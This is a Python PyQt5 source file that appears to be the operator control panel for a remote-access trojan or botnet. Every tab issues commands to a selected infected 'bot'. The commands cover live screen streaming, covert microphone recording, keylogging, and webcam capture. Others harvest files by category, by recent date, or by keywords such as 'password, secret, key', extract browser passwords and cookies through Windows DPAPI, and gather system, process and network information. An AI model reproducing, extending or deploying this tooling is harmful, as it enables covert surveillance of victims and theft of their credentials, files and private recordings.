#!/usr/bin/env python3
"""
Advanced Features Control Widget - GUI for ported bot.py features
"""

from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
import json
import time
from typing import Dict, Any, Optional


class AdvancedFeaturesWidget(QWidget):
    """Widget điều khiển các tính năng nâng cao từ bot.py"""
    
    # Signals for communication
    command_sent = pyqtSignal(str, str, dict)  # bot_id, command, params
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.selected_bot_id = None
        self.streaming_active = False
        self.recording_active = False
        self.harvesting_active = False
        
        self.init_ui()
        
    def init_ui(self):
        """Khởi tạo giao diện"""
        layout = QVBoxLayout()
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(10)
        
        # Title
        title = QLabel("🚀 Advanced Features")
        title.setStyleSheet("""
            QLabel {
                font-size: 24px;
                font-weight: bold;
                color: #2c3e50;
                margin-bottom: 10px;
            }
        """)
        layout.addWidget(title)
        
        # Create tabbed interface
        self.tab_widget = QTabWidget()
        self.tab_widget.setStyleSheet("""
            QTabWidget::pane {
                border: 2px solid #bdc3c7;
                border-radius: 5px;
                background: white;
            }
            QTabBar::tab {
                background: #ecf0f1;
                padding: 8px 15px;
                margin-right: 2px;
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;
                font-weight: bold;
            }
            QTabBar::tab:selected {
                background: #3498db;
                color: white;
            }
            QTabBar::tab:hover {
                background: #d5dbdb;
            }
        """)
        
        # Create tabs
        self.create_streaming_tab()
        self.create_audio_tab()
        self.create_harvest_tab()
        self.create_browser_tab()
        self.create_surveillance_tab()
        
        layout.addWidget(self.tab_widget)
        
        # Status bar
        self.create_status_bar()
        layout.addWidget(self.status_bar)
        
        self.setLayout(layout)
        
    def create_streaming_tab(self):
        """Tab cho Screen Streaming"""
        tab = QWidget()
        layout = QVBoxLayout()
        
        # Streaming controls
        streaming_group = QGroupBox("🎥 Real-time Screen Streaming")
        streaming_group.setStyleSheet(self.get_group_style("#e74c3c"))
        streaming_layout = QGridLayout()
        
        # Quality control
        quality_label = QLabel("Quality:")
        self.quality_slider = QSlider(Qt.Horizontal)
        self.quality_slider.setRange(10, 100)
        self.quality_slider.setValue(60)
        self.quality_value = QLabel("60%")
        self.quality_slider.valueChanged.connect(
            lambda v: self.quality_value.setText(f"{v}%")
        )
        
        streaming_layout.addWidget(quality_label, 0, 0)
        streaming_layout.addWidget(self.quality_slider, 0, 1)
        streaming_layout.addWidget(self.quality_value, 0, 2)
        
        # FPS control
        fps_label = QLabel("FPS:")
        self.fps_slider = QSlider(Qt.Horizontal)
        self.fps_slider.setRange(1, 10)
        self.fps_slider.setValue(2)
        self.fps_value = QLabel("2")
        self.fps_slider.valueChanged.connect(
            lambda v: self.fps_value.setText(str(v))
        )
        
        streaming_layout.addWidget(fps_label, 1, 0)
        streaming_layout.addWidget(self.fps_slider, 1, 1)
        streaming_layout.addWidget(self.fps_value, 1, 2)
        
        # Scale control
        scale_label = QLabel("Scale:")
        self.scale_slider = QSlider(Qt.Horizontal)
        self.scale_slider.setRange(25, 100)
        self.scale_slider.setValue(50)
        self.scale_value = QLabel("50%")
        self.scale_slider.valueChanged.connect(
            lambda v: self.scale_value.setText(f"{v}%")
        )
        
        streaming_layout.addWidget(scale_label, 2, 0)
        streaming_layout.addWidget(self.scale_slider, 2, 1)
        streaming_layout.addWidget(self.scale_value, 2, 2)
        
        # Control buttons
        btn_layout = QHBoxLayout()
        
        self.start_stream_btn = QPushButton("▶️ Start Stream")
        self.start_stream_btn.setStyleSheet(self.get_button_style("#27ae60"))
        self.start_stream_btn.clicked.connect(self.start_streaming)
        
        self.stop_stream_btn = QPushButton("⏹️ Stop Stream")
        self.stop_stream_btn.setStyleSheet(self.get_button_style("#e74c3c"))
        self.stop_stream_btn.clicked.connect(self.stop_streaming)
        self.stop_stream_btn.setEnabled(False)
        
        self.adjust_up_btn = QPushButton("⬆️ Quality+")
        self.adjust_up_btn.setStyleSheet(self.get_button_style("#3498db"))
        self.adjust_up_btn.clicked.connect(lambda: self.adjust_streaming('quality', 10))
        
        self.adjust_down_btn = QPushButton("⬇️ Quality-")
        self.adjust_down_btn.setStyleSheet(self.get_button_style("#f39c12"))
        self.adjust_down_btn.clicked.connect(lambda: self.adjust_streaming('quality', -10))
        
        btn_layout.addWidget(self.start_stream_btn)
        btn_layout.addWidget(self.stop_stream_btn)
        btn_layout.addWidget(self.adjust_up_btn)
        btn_layout.addWidget(self.adjust_down_btn)
        
        streaming_layout.addLayout(btn_layout, 3, 0, 1, 3)
        
        # Stream viewer
        self.stream_viewer = QLabel("Stream will appear here...")
        self.stream_viewer.setStyleSheet("""
            QLabel {
                border: 2px dashed #bdc3c7;
                border-radius: 10px;
                min-height: 200px;
                background: #ecf0f1;
                color: #7f8c8d;
                font-size: 14px;
                text-align: center;
            }
        """)
        self.stream_viewer.setAlignment(Qt.AlignCenter)
        streaming_layout.addWidget(self.stream_viewer, 4, 0, 1, 3)
        
        streaming_group.setLayout(streaming_layout)
        layout.addWidget(streaming_group)
        layout.addStretch()
        
        tab.setLayout(layout)
        self.tab_widget.addTab(tab, "🎥 Streaming")
        
    def create_audio_tab(self):
        """Tab cho Audio Recording"""
        tab = QWidget()
        layout = QVBoxLayout()
        
        # Audio recording controls
        audio_group = QGroupBox("🎤 Audio Recording")
        audio_group.setStyleSheet(self.get_group_style("#9b59b6"))
        audio_layout = QGridLayout()
        
        # Device selection
        device_label = QLabel("Audio Device:")
        self.audio_device_combo = QComboBox()
        self.audio_device_combo.addItems(["Default Device", "Microphone", "Stereo Mix"])
        
        audio_layout.addWidget(device_label, 0, 0)
        audio_layout.addWidget(self.audio_device_combo, 0, 1, 1, 2)
        
        # Duration control
        duration_label = QLabel("Duration (seconds):")
        self.duration_spin = QSpinBox()
        self.duration_spin.setRange(1, 3600)
        self.duration_spin.setValue(10)
        
        audio_layout.addWidget(duration_label, 1, 0)
        audio_layout.addWidget(self.duration_spin, 1, 1)
        
        # Sample rate
        rate_label = QLabel("Sample Rate:")
        self.rate_combo = QComboBox()
        self.rate_combo.addItems(["44100 Hz", "22050 Hz", "16000 Hz", "8000 Hz"])
        
        audio_layout.addWidget(rate_label, 1, 2)
        audio_layout.addWidget(self.rate_combo, 1, 3)
        
        # Control buttons
        btn_layout = QHBoxLayout()
        
        self.record_btn = QPushButton("🎙️ Record")
        self.record_btn.setStyleSheet(self.get_button_style("#e74c3c"))
        self.record_btn.clicked.connect(self.record_audio)
        
        self.start_continuous_btn = QPushButton("🔴 Start Continuous")
        self.start_continuous_btn.setStyleSheet(self.get_button_style("#e67e22"))
        self.start_continuous_btn.clicked.connect(self.start_continuous_recording)
        
        self.stop_continuous_btn = QPushButton("⏹️ Stop Continuous")
        self.stop_continuous_btn.setStyleSheet(self.get_button_style("#95a5a6"))
        self.stop_continuous_btn.clicked.connect(self.stop_continuous_recording)
        self.stop_continuous_btn.setEnabled(False)
        
        self.test_device_btn = QPushButton("🔧 Test Device")
        self.test_device_btn.setStyleSheet(self.get_button_style("#3498db"))
        self.test_device_btn.clicked.connect(self.test_audio_device)
        
        btn_layout.addWidget(self.record_btn)
        btn_layout.addWidget(self.start_continuous_btn)
        btn_layout.addWidget(self.stop_continuous_btn)
        btn_layout.addWidget(self.test_device_btn)
        
        audio_layout.addLayout(btn_layout, 2, 0, 1, 4)
        
        # Audio status
        self.audio_status = QTextEdit()
        self.audio_status.setMaximumHeight(100)
        self.audio_status.setPlainText("Audio recording status will appear here...")
        self.audio_status.setStyleSheet("""
            QTextEdit {
                border: 1px solid #bdc3c7;
                border-radius: 5px;
                background: #f8f9fa;
                font-family: 'Consolas', monospace;
                font-size: 11px;
            }
        """)
        
        audio_layout.addWidget(self.audio_status, 3, 0, 1, 4)
        
        audio_group.setLayout(audio_layout)
        layout.addWidget(audio_group)
        layout.addStretch()
        
        tab.setLayout(layout)
        self.tab_widget.addTab(tab, "🎤 Audio")
        
    def create_harvest_tab(self):
        """Tab cho File Harvesting"""
        tab = QWidget()
        layout = QVBoxLayout()
        
        # File harvesting controls
        harvest_group = QGroupBox("📁 Advanced File Harvesting")
        harvest_group.setStyleSheet(self.get_group_style("#f39c12"))
        harvest_layout = QGridLayout()
        
        # Category selection
        category_label = QLabel("File Categories:")
        self.category_list = QListWidget()
        self.category_list.setSelectionMode(QAbstractItemView.MultiSelection)
        self.category_list.setMaximumHeight(120)
        
        categories = [
            "📄 Documents", "🖼️ Images", "🎥 Videos", "🎵 Audio",
            "📦 Archives", "💻 Code", "🔐 Crypto", "📊 Data"
        ]
        
        for category in categories:
            item = QListWidgetItem(category)
            self.category_list.addItem(item)
            
        harvest_layout.addWidget(category_label, 0, 0)
        harvest_layout.addWidget(self.category_list, 0, 1, 3, 1)
        
        # Harvest settings
        max_files_label = QLabel("Max Files:")
        self.max_files_spin = QSpinBox()
        self.max_files_spin.setRange(1, 10000)
        self.max_files_spin.setValue(1000)
        
        harvest_layout.addWidget(max_files_label, 0, 2)
        harvest_layout.addWidget(self.max_files_spin, 0, 3)
        
        max_size_label = QLabel("Max Size (MB):")
        self.max_size_spin = QSpinBox()
        self.max_size_spin.setRange(1, 10000)
        self.max_size_spin.setValue(500)
        
        harvest_layout.addWidget(max_size_label, 1, 2)
        harvest_layout.addWidget(self.max_size_spin, 1, 3)
        
        # Recent files
        recent_days_label = QLabel("Recent Days:")
        self.recent_days_spin = QSpinBox()
        self.recent_days_spin.setRange(1, 365)
        self.recent_days_spin.setValue(7)
        
        harvest_layout.addWidget(recent_days_label, 2, 2)
        harvest_layout.addWidget(self.recent_days_spin, 2, 3)
        
        # Keywords search
        keywords_label = QLabel("Search Keywords:")
        self.keywords_input = QLineEdit()
        self.keywords_input.setPlaceholderText("password, secret, key (comma separated)")
        
        harvest_layout.addWidget(keywords_label, 3, 0)
        harvest_layout.addWidget(self.keywords_input, 3, 1, 1, 3)
        
        # Control buttons
        btn_layout = QHBoxLayout()
        
        self.harvest_category_btn = QPushButton("📂 Harvest by Category")
        self.harvest_category_btn.setStyleSheet(self.get_button_style("#e67e22"))
        self.harvest_category_btn.clicked.connect(self.harvest_by_category)
        
        self.harvest_recent_btn = QPushButton("🕒 Harvest Recent")
        self.harvest_recent_btn.setStyleSheet(self.get_button_style("#3498db"))
        self.harvest_recent_btn.clicked.connect(self.harvest_recent)
        
        self.harvest_search_btn = QPushButton("🔍 Search Content")
        self.harvest_search_btn.setStyleSheet(self.get_button_style("#9b59b6"))
        self.harvest_search_btn.clicked.connect(self.harvest_search)
        
        self.harvest_large_btn = QPushButton("📊 Large Files")
        self.harvest_large_btn.setStyleSheet(self.get_button_style("#e74c3c"))
        self.harvest_large_btn.clicked.connect(self.harvest_large)
        
        btn_layout.addWidget(self.harvest_category_btn)
        btn_layout.addWidget(self.harvest_recent_btn)
        btn_layout.addWidget(self.harvest_search_btn)
        btn_layout.addWidget(self.harvest_large_btn)
        
        harvest_layout.addLayout(btn_layout, 4, 0, 1, 4)
        
        # Harvest status
        self.harvest_status = QTextEdit()
        self.harvest_status.setMaximumHeight(100)
        self.harvest_status.setPlainText("File harvesting status will appear here...")
        self.harvest_status.setStyleSheet("""
            QTextEdit {
                border: 1px solid #bdc3c7;
                border-radius: 5px;
                background: #f8f9fa;
                font-family: 'Consolas', monospace;
                font-size: 11px;
            }
        """)
        
        harvest_layout.addWidget(self.harvest_status, 5, 0, 1, 4)
        
        harvest_group.setLayout(harvest_layout)
        layout.addWidget(harvest_group)
        layout.addStretch()
        
        tab.setLayout(layout)
        self.tab_widget.addTab(tab, "📁 Harvest")
        
    def create_browser_tab(self):
        """Tab cho Browser Data Extraction"""
        tab = QWidget()
        layout = QVBoxLayout()
        
        # Browser extraction controls
        browser_group = QGroupBox("🔐 Browser Data Extraction (Windows DPAPI)")
        browser_group.setStyleSheet(self.get_group_style("#2c3e50"))
        browser_layout = QGridLayout()
        
        # Browser selection
        browser_label = QLabel("Browsers:")
        self.browser_list = QListWidget()
        self.browser_list.setSelectionMode(QAbstractItemView.MultiSelection)
        self.browser_list.setMaximumHeight(100)
        
        browsers = ["🌐 Chrome", "🌊 Edge", "🔥 Firefox", "🎭 Opera", "🦁 Brave", "📱 Vivaldi"]
        for browser in browsers:
            item = QListWidgetItem(browser)
            self.browser_list.addItem(item)
            
        browser_layout.addWidget(browser_label, 0, 0)
        browser_layout.addWidget(self.browser_list, 0, 1, 2, 2)
        
        # Extraction options
        extract_label = QLabel("Extract:")
        self.extract_passwords_cb = QCheckBox("🔑 Passwords")
        self.extract_passwords_cb.setChecked(True)
        self.extract_cookies_cb = QCheckBox("🍪 Cookies")
        self.extract_cookies_cb.setChecked(True)
        self.extract_history_cb = QCheckBox("📚 History")
        self.extract_history_cb.setChecked(False)
        
        extract_layout = QVBoxLayout()
        extract_layout.addWidget(self.extract_passwords_cb)
        extract_layout.addWidget(self.extract_cookies_cb)
        extract_layout.addWidget(self.extract_history_cb)
        
        browser_layout.addWidget(extract_label, 0, 3)
        browser_layout.addLayout(extract_layout, 0, 4, 2, 1)
        
        # Control buttons
        btn_layout = QHBoxLayout()
        
        self.extract_passwords_btn = QPushButton("🔓 Extract Passwords")
        self.extract_passwords_btn.setStyleSheet(self.get_button_style("#e74c3c"))
        self.extract_passwords_btn.clicked.connect(self.extract_passwords)
        
        self.extract_cookies_btn = QPushButton("🍪 Extract Cookies")
        self.extract_cookies_btn.setStyleSheet(self.get_button_style("#f39c12"))
        self.extract_cookies_btn.clicked.connect(self.extract_cookies)
        
        self.extract_history_btn = QPushButton("📖 Extract History")
        self.extract_history_btn.setStyleSheet(self.get_button_style("#3498db"))
        self.extract_history_btn.clicked.connect(self.extract_history)
        
        self.check_browsers_btn = QPushButton("🔍 Check Browsers")
        self.check_browsers_btn.setStyleSheet(self.get_button_style("#27ae60"))
        self.check_browsers_btn.clicked.connect(self.check_available_browsers)
        
        btn_layout.addWidget(self.extract_passwords_btn)
        btn_layout.addWidget(self.extract_cookies_btn)
        btn_layout.addWidget(self.extract_history_btn)
        btn_layout.addWidget(self.check_browsers_btn)
        
        browser_layout.addLayout(btn_layout, 2, 0, 1, 5)
        
        # Browser status
        self.browser_status = QTextEdit()
        self.browser_status.setMaximumHeight(120)
        self.browser_status.setPlainText("Browser extraction status will appear here...\nNote: Windows DPAPI features only work on Windows systems.")
        self.browser_status.setStyleSheet("""
            QTextEdit {
                border: 1px solid #bdc3c7;
                border-radius: 5px;
                background: #f8f9fa;
                font-family: 'Consolas', monospace;
                font-size: 11px;
            }
        """)
        
        browser_layout.addWidget(self.browser_status, 3, 0, 1, 5)
        
        browser_group.setLayout(browser_layout)
        layout.addWidget(browser_group)
        layout.addStretch()
        
        tab.setLayout(layout)
        self.tab_widget.addTab(tab, "🔐 Browser")
        
    def create_surveillance_tab(self):
        """Tab cho Enhanced Surveillance"""
        tab = QWidget()
        layout = QVBoxLayout()
        
        # Enhanced keylogger
        keylog_group = QGroupBox("⌨️ Enhanced Keylogger")
        keylog_group.setStyleSheet(self.get_group_style("#34495e"))
        keylog_layout = QHBoxLayout()
        
        self.start_keylog_btn = QPushButton("▶️ Start Keylogger")
        self.start_keylog_btn.setStyleSheet(self.get_button_style("#27ae60"))
        self.start_keylog_btn.clicked.connect(self.start_keylogger)
        
        self.stop_keylog_btn = QPushButton("⏹️ Stop Keylogger")
        self.stop_keylog_btn.setStyleSheet(self.get_button_style("#e74c3c"))
        self.stop_keylog_btn.clicked.connect(self.stop_keylogger)
        self.stop_keylog_btn.setEnabled(False)
        
        self.get_keylog_btn = QPushButton("📋 Get Logs")
        self.get_keylog_btn.setStyleSheet(self.get_button_style("#3498db"))
        self.get_keylog_btn.clicked.connect(self.get_keylog_data)
        
        keylog_layout.addWidget(self.start_keylog_btn)
        keylog_layout.addWidget(self.stop_keylog_btn)
        keylog_layout.addWidget(self.get_keylog_btn)
        keylog_layout.addStretch()
        
        keylog_group.setLayout(keylog_layout)
        layout.addWidget(keylog_group)
        
        # Enhanced webcam
        webcam_group = QGroupBox("📹 Enhanced Webcam")
        webcam_group.setStyleSheet(self.get_group_style("#e67e22"))
        webcam_layout = QGridLayout()
        
        # Device selection
        webcam_device_label = QLabel("Camera:")
        self.webcam_device_combo = QComboBox()
        self.webcam_device_combo.addItems(["Default Camera", "USB Camera", "Integrated Camera"])
        
        webcam_layout.addWidget(webcam_device_label, 0, 0)
        webcam_layout.addWidget(self.webcam_device_combo, 0, 1)
        
        # Duration for video
        video_duration_label = QLabel("Video Duration (s):")
        self.video_duration_spin = QSpinBox()
        self.video_duration_spin.setRange(1, 300)
        self.video_duration_spin.setValue(10)
        
        webcam_layout.addWidget(video_duration_label, 0, 2)
        webcam_layout.addWidget(self.video_duration_spin, 0, 3)
        
        # Control buttons
        webcam_btn_layout = QHBoxLayout()
        
        self.capture_image_btn = QPushButton("📷 Capture Image")
        self.capture_image_btn.setStyleSheet(self.get_button_style("#9b59b6"))
        self.capture_image_btn.clicked.connect(self.capture_webcam_image)
        
        self.record_video_btn = QPushButton("🎬 Record Video")
        self.record_video_btn.setStyleSheet(self.get_button_style("#e74c3c"))
        self.record_video_btn.clicked.connect(self.record_webcam_video)
        
        self.list_devices_btn = QPushButton("📋 List Devices")
        self.list_devices_btn.setStyleSheet(self.get_button_style("#3498db"))
        self.list_devices_btn.clicked.connect(self.list_webcam_devices)
        
        webcam_btn_layout.addWidget(self.capture_image_btn)
        webcam_btn_layout.addWidget(self.record_video_btn)
        webcam_btn_layout.addWidget(self.list_devices_btn)
        
        webcam_layout.addLayout(webcam_btn_layout, 1, 0, 1, 4)
        
        webcam_group.setLayout(webcam_layout)
        layout.addWidget(webcam_group)
        
        # System information
        sysinfo_group = QGroupBox("ℹ️ Enhanced System Information")
        sysinfo_group.setStyleSheet(self.get_group_style("#16a085"))
        sysinfo_layout = QHBoxLayout()
        
        self.sysinfo_full_btn = QPushButton("📊 Full System Info")
        self.sysinfo_full_btn.setStyleSheet(self.get_button_style("#27ae60"))
        self.sysinfo_full_btn.clicked.connect(self.get_full_sysinfo)
        
        self.sysinfo_processes_btn = QPushButton("⚙️ Process List")
        self.sysinfo_processes_btn.setStyleSheet(self.get_button_style("#f39c12"))
        self.sysinfo_processes_btn.clicked.connect(self.get_processes)
        
        self.sysinfo_network_btn = QPushButton("🌐 Network Info")
        self.sysinfo_network_btn.setStyleSheet(self.get_button_style("#3498db"))
        self.sysinfo_network_btn.clicked.connect(self.get_network_info)
        
        sysinfo_layout.addWidget(self.sysinfo_full_btn)
        sysinfo_layout.addWidget(self.sysinfo_processes_btn)
        sysinfo_layout.addWidget(self.sysinfo_network_btn)
        sysinfo_layout.addStretch()
        
        sysinfo_group.setLayout(sysinfo_layout)
        layout.addWidget(sysinfo_group)
        
        layout.addStretch()
        tab.setLayout(layout)
        self.tab_widget.addTab(tab, "🎯 Surveillance")
        
    def create_status_bar(self):
        """Tạo status bar"""
        self.status_bar = QWidget()
        self.status_bar.setFixedHeight(60)
        self.status_bar.setStyleSheet("""
            QWidget {
                background: #34495e;
                border-radius: 5px;
                color: white;
            }
        """)
        
        layout = QHBoxLayout()
        layout.setContentsMargins(15, 10, 15, 10)
        
        # Selected bot
        self.selected_bot_label = QLabel("No bot selected")
        self.selected_bot_label.setStyleSheet("color: white; font-weight: bold;")
        
        # Feature status
        self.feature_status_label = QLabel("Ready")
        self.feature_status_label.setStyleSheet("color: #2ecc71; font-weight: bold;")
        
        # Last update time
        self.last_update_label = QLabel(f"Updated: {time.strftime('%H:%M:%S')}")
        self.last_update_label.setStyleSheet("color: #bdc3c7;")
        
        layout.addWidget(QLabel("🤖"))
        layout.addWidget(self.selected_bot_label)
        layout.addStretch()
        layout.addWidget(QLabel("📡"))
        layout.addWidget(self.feature_status_label)
        layout.addStretch()
        layout.addWidget(self.last_update_label)
        
        self.status_bar.setLayout(layout)
        
    def get_group_style(self, color):
        """Style cho group box"""
        return f"""
            QGroupBox {{
                font-weight: bold;
                border: 2px solid {color};
                border-radius: 10px;
                margin-top: 10px;
                padding-top: 10px;
                color: #2c3e50;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: {color};
            }}
        """
        
    def get_button_style(self, color):
        """Style cho button"""
        return f"""
            QPushButton {{
                background: {color};
                color: white;
                border: none;
                padding: 8px 12px;
                border-radius: 6px;
                font-weight: bold;
                font-size: 11px;
                margin: 1px;
            }}
            QPushButton:hover {{
                background: {self.darken_color(color)};
            }}
            QPushButton:pressed {{
                background: {self.darken_color(color, 0.8)};
            }}
            QPushButton:disabled {{
                background: #bdc3c7;
                color: #7f8c8d;
            }}
        """
        
    def darken_color(self, hex_color, factor=0.9):
        """Làm tối màu"""
        hex_color = hex_color.lstrip('#')
        rgb = tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
        rgb = tuple(int(c * factor) for c in rgb)
        return f"#{rgb[0]:02x}{rgb[1]:02x}{rgb[2]:02x}"
        
    def set_selected_bot(self, bot_id: str):
        """Set bot được chọn"""
        self.selected_bot_id = bot_id
        self.selected_bot_label.setText(f"Bot: {bot_id}")
        self.update_status("Bot selected")
        
    def update_status(self, message: str, color: str = "#2ecc71"):
        """Update status message"""
        self.feature_status_label.setText(message)
        self.feature_status_label.setStyleSheet(f"color: {color}; font-weight: bold;")
        self.last_update_label.setText(f"Updated: {time.strftime('%H:%M:%S')}")
        
    # Screen Streaming Methods
    def start_streaming(self):
        """Bắt đầu streaming"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        params = {
            'quality': self.quality_slider.value(),
            'fps': self.fps_slider.value(),
            'scale': self.scale_slider.value()
        }
        
        self.command_sent.emit(self.selected_bot_id, 'stream_start', params)
        self.streaming_active = True
        self.start_stream_btn.setEnabled(False)
        self.stop_stream_btn.setEnabled(True)
        self.update_status("Streaming started", "#27ae60")
        
    def stop_streaming(self):
        """Dừng streaming"""
        if not self.selected_bot_id:
            return
            
        self.command_sent.emit(self.selected_bot_id, 'stream_stop', {})
        self.streaming_active = False
        self.start_stream_btn.setEnabled(True)
        self.stop_stream_btn.setEnabled(False)
        self.update_status("Streaming stopped", "#f39c12")
        
    def adjust_streaming(self, param_type: str, delta: int):
        """Điều chỉnh streaming parameters"""
        if not self.streaming_active:
            return
            
        params = {f'{param_type}_delta': delta}
        self.command_sent.emit(self.selected_bot_id, 'stream_adjust', params)
        self.update_status(f"Adjusted {param_type}", "#3498db")
        
    # Audio Recording Methods
    def record_audio(self):
        """Ghi âm"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        params = {
            'duration': self.duration_spin.value(),
            'device_id': self.audio_device_combo.currentIndex()
        }
        
        self.command_sent.emit(self.selected_bot_id, 'audio_record', params)
        self.update_status("Recording audio...", "#e74c3c")
        
    def start_continuous_recording(self):
        """Bắt đầu ghi âm liên tục"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        self.command_sent.emit(self.selected_bot_id, 'audio_start_continuous', {})
        self.recording_active = True
        self.start_continuous_btn.setEnabled(False)
        self.stop_continuous_btn.setEnabled(True)
        self.update_status("Continuous recording started", "#e67e22")
        
    def stop_continuous_recording(self):
        """Dừng ghi âm liên tục"""
        if not self.selected_bot_id:
            return
            
        self.command_sent.emit(self.selected_bot_id, 'audio_stop_continuous', {})
        self.recording_active = False
        self.start_continuous_btn.setEnabled(True)
        self.stop_continuous_btn.setEnabled(False)
        self.update_status("Continuous recording stopped", "#95a5a6")
        
    def test_audio_device(self):
        """Test audio device"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        params = {'device_id': self.audio_device_combo.currentIndex()}
        self.command_sent.emit(self.selected_bot_id, 'audio_test_device', params)
        self.update_status("Testing audio device...", "#3498db")
        
    # File Harvesting Methods
    def harvest_by_category(self):
        """Thu thập file theo category"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        # Get selected categories
        selected_items = self.category_list.selectedItems()
        if not selected_items:
            self.update_status("No categories selected", "#e74c3c")
            return
            
        categories = []
        for item in selected_items:
            category = item.text().split(' ', 1)[1].lower()  # Remove emoji
            categories.append(category)
            
        params = {
            'categories': categories,
            'max_files': self.max_files_spin.value(),
            'max_total_size': self.max_size_spin.value() * 1024 * 1024
        }
        
        self.command_sent.emit(self.selected_bot_id, 'harvest_category', params)
        self.harvesting_active = True
        self.update_status("Harvesting files by category...", "#f39c12")
        
    def harvest_recent(self):
        """Thu thập file recent"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        params = {
            'days': self.recent_days_spin.value(),
            'max_files': self.max_files_spin.value()
        }
        
        self.command_sent.emit(self.selected_bot_id, 'harvest_recent', params)
        self.update_status("Harvesting recent files...", "#3498db")
        
    def harvest_search(self):
        """Thu thập file theo keywords"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        keywords_text = self.keywords_input.text().strip()
        if not keywords_text:
            self.update_status("No keywords entered", "#e74c3c")
            return
            
        keywords = [k.strip() for k in keywords_text.split(',')]
        params = {
            'keywords': keywords,
            'max_files': self.max_files_spin.value()
        }
        
        self.command_sent.emit(self.selected_bot_id, 'harvest_search', params)
        self.update_status("Searching file content...", "#9b59b6")
        
    def harvest_large(self):
        """Thu thập large files"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        params = {
            'min_size': 10 * 1024 * 1024,  # 10MB
            'max_files': self.max_files_spin.value()
        }
        
        self.command_sent.emit(self.selected_bot_id, 'harvest_large', params)
        self.update_status("Harvesting large files...", "#e74c3c")
        
    # Browser Extraction Methods
    def extract_passwords(self):
        """Extract browser passwords"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        browsers = self.get_selected_browsers()
        if not browsers:
            self.update_status("No browsers selected", "#e74c3c")
            return
            
        params = {'browsers': browsers}
        self.command_sent.emit(self.selected_bot_id, 'browser_extract_passwords', params)
        self.update_status("Extracting passwords...", "#e74c3c")
        
    def extract_cookies(self):
        """Extract browser cookies"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        browsers = self.get_selected_browsers()
        if not browsers:
            self.update_status("No browsers selected", "#e74c3c")
            return
            
        params = {'browsers': browsers}
        self.command_sent.emit(self.selected_bot_id, 'browser_extract_cookies', params)
        self.update_status("Extracting cookies...", "#f39c12")
        
    def extract_history(self):
        """Extract browser history"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        browsers = self.get_selected_browsers()
        if not browsers:
            self.update_status("No browsers selected", "#e74c3c")
            return
            
        params = {'browsers': browsers}
        self.command_sent.emit(self.selected_bot_id, 'browser_extract_history', params)
        self.update_status("Extracting history...", "#3498db")
        
    def check_available_browsers(self):
        """Check available browsers"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        self.command_sent.emit(self.selected_bot_id, 'browser_get_available', {})
        self.update_status("Checking browsers...", "#27ae60")
        
    def get_selected_browsers(self):
        """Get selected browsers"""
        selected_items = self.browser_list.selectedItems()
        browsers = []
        for item in selected_items:
            browser = item.text().split(' ', 1)[1]  # Remove emoji
            browsers.append(browser)
        return browsers
        
    # Surveillance Methods
    def start_keylogger(self):
        """Start keylogger"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        self.command_sent.emit(self.selected_bot_id, 'keylog_start', {})
        self.start_keylog_btn.setEnabled(False)
        self.stop_keylog_btn.setEnabled(True)
        self.update_status("Keylogger started", "#27ae60")
        
    def stop_keylogger(self):
        """Stop keylogger"""
        if not self.selected_bot_id:
            return
            
        self.command_sent.emit(self.selected_bot_id, 'keylog_stop', {})
        self.start_keylog_btn.setEnabled(True)
        self.stop_keylog_btn.setEnabled(False)
        self.update_status("Keylogger stopped", "#e74c3c")
        
    def get_keylog_data(self):
        """Get keylog data"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        self.command_sent.emit(self.selected_bot_id, 'keylog_get_data', {})
        self.update_status("Getting keylog data...", "#3498db")
        
    def capture_webcam_image(self):
        """Capture webcam image"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        params = {'device_id': self.webcam_device_combo.currentIndex()}
        self.command_sent.emit(self.selected_bot_id, 'webcam_capture', params)
        self.update_status("Capturing image...", "#9b59b6")
        
    def record_webcam_video(self):
        """Record webcam video"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        params = {
            'device_id': self.webcam_device_combo.currentIndex(),
            'duration': self.video_duration_spin.value()
        }
        self.command_sent.emit(self.selected_bot_id, 'webcam_record', params)
        self.update_status("Recording video...", "#e74c3c")
        
    def list_webcam_devices(self):
        """List webcam devices"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        self.command_sent.emit(self.selected_bot_id, 'webcam_list_devices', {})
        self.update_status("Listing devices...", "#3498db")
        
    def get_full_sysinfo(self):
        """Get full system info"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        self.command_sent.emit(self.selected_bot_id, 'sysinfo_full', {})
        self.update_status("Getting system info...", "#27ae60")
        
    def get_processes(self):
        """Get process list"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        self.command_sent.emit(self.selected_bot_id, 'sysinfo_processes', {})
        self.update_status("Getting processes...", "#f39c12")
        
    def get_network_info(self):
        """Get network info"""
        if not self.selected_bot_id:
            self.update_status("No bot selected", "#e74c3c")
            return
            
        self.command_sent.emit(self.selected_bot_id, 'sysinfo_network', {})
